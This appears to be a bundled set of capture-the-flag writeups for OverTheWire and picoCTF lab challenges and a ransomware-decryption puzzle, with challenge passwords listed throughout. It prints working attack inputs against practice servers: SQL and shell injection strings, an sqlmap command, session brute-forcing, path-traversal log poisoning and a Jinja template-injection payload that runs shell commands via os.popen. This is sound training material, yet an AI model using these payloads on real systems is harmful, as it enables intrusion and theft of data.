<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-cookiengineer
description: CTF writeups and security challenges by cookiengineer.
---

# Writeups by cookiengineer

Source repository: `/repos/cookiengineer`

## Repository Index

- writeups/bnd-takur_medicine/README.md
- writeups/learn-go-with-tests/README.md
- writeups/overthewire-natas/README.md
- writeups/picoctf/README.md
- writeups/veloren-scavenger-hunt/02-mindflayer/README.md
- writeups/veloren-scavenger-hunt/03-knights-path/README.md
- writeups/veloren-scavenger-hunt/04-hiding-the-truth/README.md
- writeups/veloren-scavenger-hunt/05-veloren-security-agency/README.md
- writeups/veloren-scavenger-hunt/06-templo-cristi/README.md
- writeups/veloren-scavenger-hunt/07-the-path-narrows/README.md
- writeups/picoctf/008-stonks/README.md
- writeups/picoctf/009-get ahead/README.md
- writeups/picoctf/010-static aint always noise/README.md
- writeups/picoctf/011-tab tab attack/README.md
- writeups/picoctf/012-keygenme/README.md
- writeups/picoctf/013-cookies/README.md
- writeups/picoctf/014-inspector/README.md
- writeups/picoctf/015-scavenger hunt/README.md
- writeups/picoctf/016-some assembly required/README.md
- writeups/picoctf/017-more cookies/README.md
- writeups/picoctf/019-dont-use-client-side/README.md
- writeups/picoctf/020-tunnel vision/README.md
- writeups/picoctf/021-it is my birthday/README.md
- writeups/picoctf/022-who are you/README.md
- writeups/picoctf/023-login/README.md
- writeups/picoctf/024-picobrowser/README.md
- writeups/picoctf/025-client-side-again/README.md
- writeups/picoctf/026-notepad/README.md
- writeups/picoctf/027-javascript kiddie/README.md
- writeups/picoctf/028-javascript kiddie 2/README.md
- writeups/picoctf/029-irish-name-repo/README.md
- writeups/picoctf/030-some assembly required 2/README.md
- writeups/picoctf/031-some assembly required 3/README.md
- writeups/picoctf/032-local authority/README.md
- writeups/picoctf/033-search source/README.md
- writeups/picoctf/034-soap/README.md
- writeups/picoctf/035-most cookies/README.md
- writeups/picoctf/037-cowsay as a service/README.md
- writeups/picoctf/038-web gauntlet/README.md
- writeups/picoctf/039-x marks the spot/README.md
- writeups/picoctf/040-web gauntlet 2/README.md
- writeups/picoctf/041-web gauntlet 3/README.md
- writeups/overthewire-natas/natas11/README.md
- writeups/overthewire-natas/natas12/README.md
- writeups/overthewire-natas/natas13/README.md
- writeups/overthewire-natas/natas14/README.md
- writeups/overthewire-natas/natas15/README.md
- writeups/overthewire-natas/natas16/README.md
- writeups/overthewire-natas/natas17/README.md
- writeups/overthewire-natas/natas18/README.md
- writeups/overthewire-natas/natas19/README.md
- writeups/overthewire-natas/natas20/README.md
- writeups/overthewire-natas/natas21/README.md
- writeups/overthewire-natas/natas22/README.md
- writeups/overthewire-natas/natas23/README.md
- writeups/overthewire-natas/natas24/README.md
- writeups/overthewire-natas/natas25/README.md
- writeups/overthewire-leviathan/leviathan0/README.md
- writeups/overthewire-leviathan/leviathan1/README.md
- writeups/overthewire-leviathan/leviathan2/README.md
- writeups/overthewire-behemoth/solutions/behemoth0.md
- writeups/overthewire-behemoth/solutions/behemoth1.md
- writeups/gpn-22/web/flag-remover/README.md
- writeups/golang/webview-test/NOTES.md

## Writeup Content


### File: writeups/bnd-takur_medicine/README.md


# BND's Takur Medicine Ransomware Challenge

## First Problem: Broken XOR encryption/rotation with fixed key size

XOR encryption/rotation of the `zip` file uses a fixed `4 bytes length` key which
is enough to infer the possible keys from the `file headers` that a zip file usually
should have. In this case `PK\0x03\0x04` was the initial file header.

```bash
cd ./solution;

# Generates 3 possible zip files
go run ./cmds/decrypt/main.go ../challenge/geheim.zip.crypt;

# The first one is the correct one
mv ./geheim-0.zip ../challenge/geheim.zip;
```

## Second Problem: ZIP encryption password is bruteforceable

The password of the ZIP file needs to be bruteforced, and it was assumed to have a weak
character set (alphanumeric, whitespace, underscore) and standard decryption due to
AES128/AES256 probably taking too long for a challenge like this.

(The challenge duration is less than 2 weeks, and I guess they don't assume everybody
has an OpenCL compatible GPU(s) available).

**Results**:

The password of decrypted zip file (the original `geheim.zip`) is `roneisha2209` which
is part of the `rockyou.txt` file. It therefore can be either reproduced with my
self-written password cracker, or johntheripper.

```bash
cd ./solution;

# Option 1: Crack the password with my own tool
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O ./cmds/bruteforce-zip/passwords.txt;
go run ./cmds/bruteforce-zip/main.go ../geheim.zip;

# Option 2: Crack the password with johntheripper
zip2john geheim.zip > zip_hashes.txt;
john --wordlist=/path/to/rockyou.txt zip_hashes.txt;

# If you miss johntheripper being done, show password via:
john --show zip_hashes.txt;
```

## Third Problem: KeePass Master Password findable in memory dump

KeePass had a [CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784) earlier this year,
which allowed to find the offsets in a memory dump to find KeePass'es password lengths due to
KeePass using a special character to display the UI/hide the passwords.

The character that is looked for is `0xCF` followed by a `0x25` byte value, and characters for
KeePass passwords have a limited charset from `0x20` to `0xFF` because they're ASCII only.

```bash
cd ./solution;

# Find potential master keys in the memory dump
go run ./cmds/find-keypass-masterkey.go ../challenge/KeePass.DMP;
```




### File: writeups/gpn-22/web/flag-remover/README.md


ncat --ssl flag-remover.ctf.kitctf.de 443




### File: writeups/learn-go-with-tests/README.md

# Learn Go With Tests Writeup

This is my opinionated writeup of the [Learn Go with Tests](https://quii.gitbook.io/learn-go-with-tests) tutorial.


# Articles

Each of the articles are sorted in their order in the tutorial:

1. [Hello World](./helloworld)
2. [Integers](./integers)
3. [Iterations](./iterations)
4. [Slices](./slices)
5. [Methods](./methods) and [Structs](./structs) are split up
6. [Pointers](./pointers)
7. [Maps](./maps)
8. Dependency Injection
9. [Mocking](./mocking)
10. [Concurrency](./concurrency)
11. [Selects](./selects)
12. [Reflection](./reflection)
13. [Sync](./sync)
14. [Context](./context)
15. Property-based testing
16. Maths
17. Reading Files
18. Templates
19. Generics
20. Generic Slices


# License

WTFPL




### File: writeups/overthewire-leviathan/leviathan0/README.md


# Leviathan 0 (Over The Wire CTF)

Credentials:

- Username: `leviathan0`
- Password: `leviathan0`


# Problem

The `~/.backup/bookmarks.html` contains a bookmark for the `leviathan1` user.


# Solution

```bash
ssh leviathan0@leviathan.labs.overthewire.org -p 2223;

cat .backup/bookmarks.html | grep leviathan;

<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```



### File: writeups/overthewire-leviathan/leviathan1/README.md


# Leviathan 1 (Over The Wire CTF)

Credentials:

- Username: `leviathan1`
- Password: `3QJ3TgzHDq`


# Problem

The `check` binary checks against the password, so we need to download and analyze it.

```bash
cd ./challenge;

sshpass -p "3QJ3TgzHDq" scp -P 2223 leviathan1@leviathan.labs.overthewire.org:/home/leviathan1/check ./
```

# Solution

Using `ltrace ./check` we can see that the program compares the entered value `123` against `sex`,
which is the password.

```bash
leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
printf("password: ")                                             = 10
getchar(0, 0, 0x786573, 0x646f67password: 123456
)                                = 49
getchar(0, 49, 0x786573, 0x646f67)                               = 50
getchar(0, 0x3231, 0x786573, 0x646f67)                           = 51
strcmp("123", "sex")                                             = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                             = 29
+++ exited (status 0) +++
```

Executing the binary again with the password `sex`, we are now the user `leviathan2` and can
access the flag located at `/etc/leviathan_pass/leviathan2`.

```bash
leviathan1@gibson:~$ ./check 
password: sex

$ whoami
leviathan2

$ cat /etc/leviathan_pass/leviathan2
NsN1HwFoyN
```



### File: writeups/overthewire-leviathan/leviathan2/README.md


# Leviathan 2 (Over The Wire CTF)

Credentials:

- Username: `leviathan2`
- Password: `NsN1HwFoyN`

# Problem

The program `printfile` has wrong ownership permissions, as it's owned by the user `leviathan2`
but the group `leviathan3`, which we can abuse.

```bash
leviathan2@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Jun 20 04:07 .
drwxr-xr-x 83 root       root        4096 Jun 20 04:08 ..
-rw-r--r--  1 root       root         220 Mar 31 08:41 .bash_logout
-rw-r--r--  1 root       root        3771 Mar 31 08:41 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15068 Jun 20 04:07 printfile
-rw-r--r--  1 root       root         807 Mar 31 08:41 .profile
```

If we try to fiddle around with the file paths, we can see that the binary calls `access()`
and `/bin/cat %s` but doesn't verify whether or not it's a symbolic link. An alternative way
probably would be to abuse whitespaces because the call of `/bin/cat` leads to multiple arguments
when the entered parameter contains whitespaces.

```bash
leviathan2@gibson:~$ ltrace ./printfile /tmp/"foo bar qux.txt"
__libc_start_main(0x80490ed, 2, 0xffffd464, 0 <unfinished ...>
access("/tmp/foo bar qux.txt", 4)                                = 0
snprintf("/bin/cat /tmp/foo bar qux.txt", 511, "/bin/cat %s", "/tmp/foo bar qux.txt") = 29
geteuid()                                                        = 12002
geteuid()                                                        = 12002
setreuid(12002, 12002)                                           = 0
system("/bin/cat /tmp/foo bar qux.txt"/bin/cat: /tmp/foo: No such file or directory
/bin/cat: bar: No such file or directory
/bin/cat: qux.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                           = 256
+++ exited (status 0) +++
```


# Solution

```bash
watch -n 0.1 "touch /tmp/cookie/link; ln -sf /etc/leviathan_pass/leviathan3 /tmp/cookie/link; rm /tmp/cookie/link;"
```


We can download the binary to be able to analyze it.

```bash
cd ./challenge;

sshpass -p "NsN1HwFoyN" scp -P 2223 leviathan2@leviathan.labs.overthewire.org:/home/leviathan2/printfile ./
```

# Solution

TODO



### File: writeups/overthewire-natas/README.md


# Write-Ups for Overthewire Natas Challenges

This folder contains my write-ups and notes for the Natas
challenges.

The `challenge` folder always contains a `index.php` that
represents the source code which was available via the `view-source.html`
at the given time of doing the challenge.

The `solution` folder usually contains the implementation
source code in `go` when it was possible to implement the
bypass/attack remotely.

If it was a local challenge or the server was bugged and the server
wasn't reacting, there probably is no source code available. Feel
free to make a pull request for these missing challenges.


## Missing challenges/solutions

These are the missing challenges and solutions because the
server was bugged at the time of my write-up after our
weekly CTF meetup, or I couldn't reach the CTF host for
whatever reason.

- [Natas 20](./natas20): CTF throws now some errors, someone changed the source code.
- [Natas 24](./natas24): TODO




### File: writeups/overthewire-natas/natas11/README.md


# Natas 11 (Over The Wire CTF)

Credentials:

- Username: `natas11`
- Password: `1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg`


# Problem

The Cookie is XOR encrypted, which is pretty unsecure as a cipher
because it allows to find out the used repeating key.


# Solution

Two helper scripts were needed to solve this.

The first script [01_find_key.php](./solution/01_find_key.php) finds
the used original key by applying the XOR cipher on the decoded data.

In the generated output we can see that `KNHL` is a repeating pattern,
so it is most likely the used key to encrypt the cookie.

The second script [02_generate_cookie.php](./solution/02_generate_cookie.php)
generates the cookie with the necessary flags being set to pass the
challenge.

This needs to be set in the Browser (Network Tab or via `document.cookie`)
to pass the challenge. It can also be used via `curl`.




### File: writeups/overthewire-natas/natas12/README.md


# Natas 12 (Over The Wire CTF)

Credentials:

- Username: `natas12`
- Password: `YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG`


# Problem

The website's PHP code is written in a way so that it reuses
the client-side `filename` POST parameter as the designated
file name's extension.


# Solution

Craft an `image.php` file which executes code on the server-side,
and modify the `<input type=hidden name=filename value=randomstuff.php>`
so that the `php` file extension is used when the file is written
in the `upload/` folder.



### File: writeups/overthewire-natas/natas13/README.md


# Natas 13 (Over The Wire CTF)

Credentials:

- Username: `natas13`
- Password: `lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9`


# Problem

The website's PHP code is written in a way so that it reuses
the client-side `filename` POST parameter as the designated
file name's extension.

Additional security measurement is to check against EXIF file
headers. The problem is though, that PHP files can be executed
no matter what kind of text (or bytes) come before the `<?php`
header.


# Solution

Craft an `image.php` file which executes code on the server-side,
and modify the `<input type=hidden name=filename value=randomstuff.php>`
so that the `php` file extension is used when the file is written
in the `upload/` folder.

Use a valid EXIF header before the `<?php` as the first bytes of the file.
The JPEG header `0xFF 0xD8 0xFF 0xEE` worked for me.




### File: writeups/overthewire-natas/natas14/README.md


# Natas 14 (Over The Wire CTF)

Credentials:

- Username: `natas14`
- Password: `qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP`


# Problem

MySQL Injection for both `username` and `password` parameter.

The website's PHP code uses the `mysqli_num_rows()` method
which expects a boolean result, which makes the crafting aspect
of the injected SQL statement a little harder.

# Solution

- Use the `?debug` parameter first
- Second parameter is `&username=1" or "1"`
- Third parameter is `&password="1" or "1" = "1`




### File: writeups/overthewire-natas/natas15/README.md


# Natas 15 (Over The Wire CTF)

Credentials:

- Username: `natas15`
- Password: `TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB`


# Problem

MySQL Injection for `username` parameter.

The website's PHP code for checking whether or not a user exists
gives us a hint for when the executed MySQL expression returns a
true result.


# Solution

This gives us the possibility to write a Bruteforce script which
uses the `username` set to `natas16" AND password LIKE "<prefix>%`
where the `<prefix>` parameter will be set incrementally by the
tool to find out whether or not the password starts with the given
prefix.

The solution is implemented in `Go`: [solution](./solution/main.go)

```bash
cd ./solution;

go run main.go;
```



### File: writeups/overthewire-natas/natas16/README.md


# Natas 16 (Over The Wire CTF)

Credentials:

- Username: `natas16`
- Password: `TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`


# Problem

Shell Injection for `username` parameter.

The website's PHP code executes `grep -i "$username" dictionary.txt`
which leads to potential shell escape techniques, or embedded shell
execution by executing e.g. `$(echo whatever)zigzags`.


# Solution

This gives us the possibility to write a Bruteforce script which
uses the `username` set to `$(grep ^<prefix> /etc/natas_webpass/natas17)zigzags`
which can be used to see whether or not the password starts with the
given prefix.

- If the output is nothing (`<pre>\n</pre>`), it means that the password matched.
- If the output is `zigzags`, it means that the password didn't match.

The solution is implemented in `Go`: [solution](./solution/main.go)

```bash
cd ./solution;

go run main.go;
```



### File: writeups/overthewire-natas/natas17/README.md


# Natas 17 (Over The Wire CTF)

Credentials:

- Username: `natas17`
- Password: `XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd`


# Problem

SQL Injection for `username` parameter.

The website's PHP code executes an SQL query directly based on the input text field.


# Solution

The website's input text field can be abused by `sqlmap` to pipe through a lot of
exploitation techniques, and we are going to try that out.

```bash
sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --data=username=natas17 --auth-type=basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --dbms=mysql --level=5 --risk=3
```

After `sqlmap` is done detecting SQL injection techniques, it offers to dump the database
successfully. It takes a while, because the server was really slow, so it needed to increment
its `timeout` value to about `10 seconds` at the end.




### File: writeups/overthewire-natas/natas18/README.md


# Natas 18 (Over The Wire CTF)

Credentials:

- Username: `natas18`
- Password: `8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`


# Problem

The `PHPSESSID` identifier is weak and can be bruteforced, the identifiers
are incrementing and there's a hardcap limit of `640` which means that it's
very feasible to hijack other sessions.


# Solution

The weak session identifier allows us to hijack and iterate over the session ids,
and setting the `Cookie` HTTP header to gain access to another session that's
already running and actively used by another user.

In our case, the session `119` was logged in with the `admin` user. The
implementation detects that session successfully.

```bash
cd ./solution;

go run main.go;
```




### File: writeups/overthewire-natas/natas19/README.md


# Natas 19 (Over The Wire CTF)

Credentials:

- Username: `natas19`
- Password: `8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s`


# Problem

The `PHPSESSID` identifier is weak and can be bruteforced, the identifiers
are incrementing and there's a hardcap limit of `640` which means that it's
very feasible to hijack other sessions.

The previous CTF [Natas 18](../natas18) used only the number as the session
identifier, but this one uses a hexadecimal encoded variant of the format
`<number>-<user>` which is equivalently unsafe as an identifier format.


# Solution

The weak session identifier allows us to hijack and iterate over the session ids,
and setting the `Cookie` HTTP header to gain access to another session that's
already running and actively used by another user.

In our case, the session `bin2hex("281-admin")` was logged in with the `admin` user.
The implementation detects that session successfully.

```bash
cd ./solution;

go run main.go;
```




### File: writeups/overthewire-natas/natas20/README.md


# Natas 20 (Over The Wire CTF)

Credentials:

- Username: `natas20`
- Password: `guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH`


# Problem

The `mywrite(sid, data)` method serializes data in an unsafe way, using
a `\n` as a delimiter for each `key value\n` pair. This leaves the `myread(sid)`
method vulnerable, because it is using a loop that relies on `foreach(explode("\n", data))`.

This allows an attacker to override a `key` using an injected `\n` character
in the posted name value.


# Solution

The `name` variable can be changed to `whatever\nadmin 1` in order to override
the `admin` key, which will lead to the `myread()` method building a wrong session
object.

```bash
cd ./solution;

go run main.go;
```




### File: writeups/overthewire-natas/natas21/README.md


# Natas 21 (Over The Wire CTF)

Credentials:

- Username: `natas21`
- Password: `89OWrTkGmiLZLv12JY4tLj2c4FW0xn56`


# Problem

The session cookies for the `natas21-experimenter` colocated page don't have a correct
domain scope nor a path limitation, which leads to that the session cookies can be
reused on the other subdomain.

# Solution

The (colocated) experimenter page allows to use some debug flags and to override the
admin flag by simply appending the `?debug` parameters to the URL. This will lead to
all parameters in the `POST` body being set into the `$_SESSION` object, which in
return allows us to set any key/value pair.

Then it's possible to reuse the session cookie from the experimenter page to the
colocated CTF page, and the session cookie will lead to the password being revealed.

```bash
cd ./solution;

go run main.go;
```




### File: writeups/overthewire-natas/natas22/README.md


# Natas 22 (Over The Wire CTF)

Credentials:

- Username: `natas22`
- Password: `91awVM9oDiUGm33JdzM7RVLBS8bz9n0s`


# Problem

Redirects are not a safe way to fix problems in the following code.

The `GET` parameter `?revelio` leads to the password being printed.

The code also tries to hide the admin password by using a `Location`
HTTP header which leads to a redirect, which is obviously not a secure
way to hide the mistake of printing the password.


# Solution

In the Network Debugger of the Web Browser, there is a field to persist
the network request log (Settings Icon, Persist Logs in Firefox), which
will reveal the password.

The solution, however, just gets the original request without following
the `Location` redirect header.

```bash
cd ./solution;

go run main.go;
```




### File: writeups/overthewire-natas/natas23/README.md


# Natas 23 (Over The Wire CTF)

Credentials:

- Username: `natas23`
- Password: `qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj`


# Problem

The comparison for the password depends on two conditions:

`$_REQUEST["passwd"] > 10`:

PHPs type casting system can be abused to bypass this, with a string
starting with "number_iloveyou" where `number` must be a value greater
than 10 as a string. For example, `123iloveyou` would also fulfill
this condition.

`strstr($_REQUEST["passwd"], "iloveyou")`:

This condition only checks whether or not the string contains the
string value `iloveyou`.

# Solution

The `passwd` parameter can be set to `11iloveyou` to bypass the
password check.

```bash
cd ./solution;

go run main.go;
```




### File: writeups/overthewire-natas/natas24/README.md


TODO

Password for natas24

0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r



### File: writeups/overthewire-natas/natas25/README.md


# Natas 25 (Over The Wire CTF)

Credentials:

- Username: `natas25`
- Password: `O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx`


# Problem

The error logging method which is used to log path traversal attempts for the `natas_webpass`
file paths uses the unsanitized `User-Agent` HTTP header and appends it into the log file.

Combined with the path traversal detection mechanism only using a string replacement once
(and not until no match is found) means that this very log file can be included and executed
via PHP.

The path traversal method can be bypassed by prepending `..` and appending a `/` like so:

- `....//` will lead to a `../`
- `..//` will lead to a `./`

The PHP session identifier (`PHPSESSID`) is also known to the end-user because it is set via
the `Set-Cookie` header, which makes the file names in `/var/www/natas/natas25/logs` predictable.


# Solution

It is necessary to do 3 HTTP requests:

1. Get the index file and parse the `Cookie` header to get the `PHPSESSID` identifier.
2. Get the `?lang=natas_webpass` file to trigger the `logRequest()` method, and use `User-Agent: <?php (...) ?>` and `Cookie: (...)`.
3. Get the `?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_(...).log`.

```bash
cd ./solution;

go run main.go;
```




### File: writeups/picoctf/008-stonks/README.md


# Stonks

C Format String vulnerability


# Problem

The server's sample program `vuln.c` uses `printf()` which
is vulnerable to overflows.


# Solution

Entering `%X` loooooots of times will get us higher in the
memory stack, allowing us to read the memory that we're not
supposed to be able to read.




### File: writeups/picoctf/009-get ahead/README.md


# GET aHEAD


# Problem

The server-side program will return the flag when using
a specific HTTP verb. It's up to the user to find out.


# Solution

I implemented a simple `bruteforce.mjs` that hopefully
has all specification-compliant HTTP verbs in them and
will simply do the requests automatically.




### File: writeups/picoctf/010-static aint always noise/README.md


# Static ain't always noise

Binary containing plaintext strings


# Problem

The sample program / binary contains the flag,
and it is up to the user to find it.


# Solution

Simply use `objdump` and `strings` to find the
strings in the `.text` section of the binary.

Either that, or execute the sample script `ltdis.sh`
that does that for you.

```bash
objdump -sj .text -D ./path/to/static;
strings -a -t x ./path/to/static;
```




### File: writeups/picoctf/011-tab tab attack/README.md


# Tab Tab Attack

Binary containing plaintext strings


# Problem

The sample program / binary contains the flag,
and it is up to the user to find it.


# Solution

Simply use `objdump` and `strings` to find the
strings in the `.text` section of the binary.

```bash
objdump -sj .text -D ./path/to/fang-of-haynekhtnamet;
strings -a ./path/to/fang-of-haynekhtnamet;
```




### File: writeups/picoctf/012-keygenme/README.md


# Keygen Me

Never use static hashes


# Problem

The License Verification Method of a sample program is very
unsecure and uses prefixes and suffixes, with a static user
hash in order to validate whether or not the license is valid.


# Solution

I wrote a simple `keygen.mjs` file that recreates the expected
values similar to how the sample program expected it.

It's pretty easy to do so, because the code of the sample
program is easy to understand and not really obfuscated.




### File: writeups/picoctf/013-cookies/README.md


# Cookies

Incremented Session IDs are not secure


# Problem

The server-side implementation uses guessable Session IDs,
which means that the `Cookie: <Number>` header represents
logged in users.


# Solution

As the Cookies are easily spoofable, it's also easy to
bruteforce them to get access. In my `bruteforce.mjs`
implementation I just looked at the first 64 sessions
to find a flag and got it.




### File: writeups/picoctf/014-inspector/README.md


# Inspector


# Problem

The website is setup in a way that it offers parts of the
flag in several snippets that are located within default
files of typical server setups.


# Solution

Well, just curl around a couple of URLs and try out some
defaults, it's an easy challenge.




### File: writeups/picoctf/015-scavenger hunt/README.md


# Scavenger Hunt


# Problem

The website is setup in a way that it offers parts of the
flag in several snippets that are located within default
files of typical server setups.


# Solution

Well, just curl around a couple of URLs and try out some
defaults, it's an easy challenge.




### File: writeups/picoctf/016-some assembly required/README.md


# Some Assembly Required

WebASM isn't a good obfuscation method


# Problem

The client-side validates the password/flag on the client-side,
but it's using WebASM as an intermediary language.

# Solution

The generated JavaScript code is hard to read, and was obfuscated
a little. With a step-by-step approach it's doable, and the initial
dictionary used an offset to lookup the static string values.




### File: writeups/picoctf/017-more cookies/README.md


# More Cookies

AES CBC Mode Encryption is not secure


# Problem

The server-side implementation uses AES encryption in CBC Mode,
which means that it is vulnerable to a Bit Flipping Attack.

In AES, the cypher is cyclic, which also implies that the first
128 bits in this case will lead to flipping the bits in the
decrypted plaintext.


# Solution

I first tried to implement it in node.js via the `bruteforce.mjs`
script, but somehow I messed it up and crashed the server after
a bunch of requests. So be careful not to run it too often :(


1. Decode the base64 encoded cookie
2. Decode the base64 encoded cookie again (yeah, so safe)
3. For the first 128 bits (assuming CBC 128 bit key length) flip each bit.
4. Encode the spoofed cookie via base64.
5. Encode the spoofed cookie again via base64.
6. Send the spoofed cookie to the server, which will behave differently (with a redirect) in case of success.




### File: writeups/picoctf/019-dont-use-client-side/README.md


# Don't Use Client-Side


# Problem

The code does client-side validation of the password,
which is also the flag.


# Solution

Understand/Inspect the code and put together the chunks
of the password. It's pretty easy.




### File: writeups/picoctf/020-tunnel vision/README.md


# Tunnel Vision

Corrupted BMP file


# Problem

The BMP file is corrupted, and the challenge is to find the bytes
that are corrupted and to modify them, so that the picture is
visible again.


# Solution

This is a manual process in a Hex Editor. I used `ImHex`, because
it offers `patterns` for specific file formats such as `BMP`, and
this makes it super-easy to identify corrupted values that don't
match the expected patterns and/or static headers.




### File: writeups/picoctf/021-it is my birthday/README.md


# It Is My Birthday

MD5 is not a collision-safe hash algorithm


# Problem

On the server-side, the code expects two different `PDF` which
are expected to be two files with the same `MD5` hash.


# Solution

As the code on the server-side is too stupid to validate the
metadata of a PDF file, it's possible to use the demo collisions
from the paper about MD5 collisions and renaming the `.exe` files
into `.pdf` to get the flag.

Another method would've been to use the `evilize` tool from the
paper to generate two separate PDF files with a colliding hash.




### File: writeups/picoctf/022-who are you/README.md


# Who Are You?


# Problem

The code on the server-side uses a series of HTTP headers and clues
to verify whether or not the client is allowed to access the website.


# Solution

Simply use `curl -H 'Header: Value'` to override the HTTP headers.

As all HTTP headers that are used in this Challenge are spec-compliant
with RFC2616, there's not that many options to choose from :)




### File: writeups/picoctf/023-login/README.md


# Login

base64 is not an encryption


# Problem

The code does client-side validation of the password, and tries to obfuscate
it a little by using `base64` as an encoding algorithm.


# Solution

This is a manual process, simply copy the encoded value and decode it via
the `base64` command.

```bash
# username is admin
echo "YWRtaW4=" | base64 -d;

# password/flag is picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
echo "cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ==" | base64 -d;
```




### File: writeups/picoctf/024-picobrowser/README.md


# PicoBrowser


# Problem

The code on the server-side uses HTTP headers to verify whether
or not the `User-Agent` is set to `picobrowser`.


# Solution

Simply use `curl -H 'Header: Value'` to override the HTTP headers.




### File: writeups/picoctf/025-client-side-again/README.md


# Client-Side Again


# Problem

The code does client-side validation, and tries to obfuscate
it a little by using comparisons that don't actually matter.

This is strictly a code reverse-engineering challenge, and
the idea is to learn JavaScript code and how it works.

It's pretty easy, actually. The added obfuscation was just
there to rotate around the DICTIONARY a little, but that's
pretty much it.


# Solution

This is a manual process, so it needs some beautification
of the JS code. I used `js-beautify` to get started and
went from there.




### File: writeups/picoctf/026-notepad/README.md


# Notepad

Jinja template engine injection possibilities.


# Problem

The challenge is to bypass the filters in order to get a successfully executed
python code inside the rendered templates on the server-side.

The server is implemented in Flask, and uses a template engine there which renders
the error templates; and assumes that are safe to render with the `request` object.



# Solution

In order to successfully write to an error template file, we need to achieve the following:

- The input must be `> 128 bytes` and `< 512 bytes` so that it doesn't trigger the `long content` error condition.
- The input must not use `_` and `/`, otherwise it will be filtered out.
- The input generates a filename based on the first `128 bytes` of the content, which means that we can modify the path it is written to.
- The generated filename also uses a `urlfix` suffix which makes it harder to read/write to other files.


## 1. Write a file that gets rendered with the template engine

If we type in the following content into the textarea, we'll successfully write to a file in the `/templates/error` folder:

```plaintext
..\templates\errors\aaa... (repeat ~128 times)
```

The `POST` request of the form will redirect to another page, which contains the generated URL.

We copy the URL of the `/static/templates/aaa...-suffix.html` and we modify it so that it looks
like this: `http://server:port/?error=aaa...-suffix`. This will successfully render our generated
file, because the error parameter will include and render the file directly via the [index template](./challenge/templates/index.html).


## 2. Execute injected python code

Now the next goal is to execute our injected code on the server. Note the trailing `{{...}}` brackets
which will let the template engine render our computed output of the expression (`91`) instead of
the actual text.

```plaintext
..\templates\errors\aaa... (repeat ~128 times)

{{ 13*7 }}
```


## 3. Execute code on the system

Now the fun part. We need to get access to some nice APIs we can use, because using `import "os"` doesn't
work. Lucky for us, the Python Inheritance model allows us to get access to the `globals` and therefore
pretty much everything that is loaded and imported already.

The [app.py](./challenge/app.py) filters out the `_` character, though, so we have to get a little creative.

We want access to the following API code:

```python
request.application.__globals__.__builtins__.__import__('os').listdir()
```

The above code translates to the following code in `attr(...)` form that bypasses the filter. Note that for
each property we have to use the internal `__getitem__(...)` method, and we use `\x5f` which is the urlencoded
variant of `_`.

```python
request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("listdir")()
```

After we've rendered the above generated error template, it returns us this:

```plaintext
\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg
['templates', 'static', 'flag-c8f5526c-4122-4578-96de-d7dd27193798.txt', 'app.py']
```

## 4. Reading the flag file

After trying out some code to read the file, we had the problem that most of the APIs require an assignment which crashes the server,
and that's why we decided to use the `os.popen(...shell command...).read()` method to get the contents. All other python APIs need
either an import statement or a file descriptor which needs an assignment, so they couldn't be used.

So the final `template exploit code` looks like this:

```plaintext
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg {{
request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt")|attr("read")()
}}
```




### File: writeups/picoctf/027-javascript kiddie/README.md


# JavaScript Kiddie

Byte-Shift-Based Encryption


# Problem

The `bytes` file contains all shifted bytes that represent a PNG image.
The PNG header is fixed and the first 16 bytes are static, and contain
the PNG header followed by the `IDHR` header.


As the `bytes` file contains only a single-digit offset for each column,
there's only one valid solution (which is automatically the first index
by coincidence).


# Solution

Instead of analyzing the file manually in a hex editor, I decided to
automate this process and write a simple `convert.mjs` script.

1. Convert the bytes into a Buffer.
2. Split the buffer into 16 columns (possible "arm bandit rows").
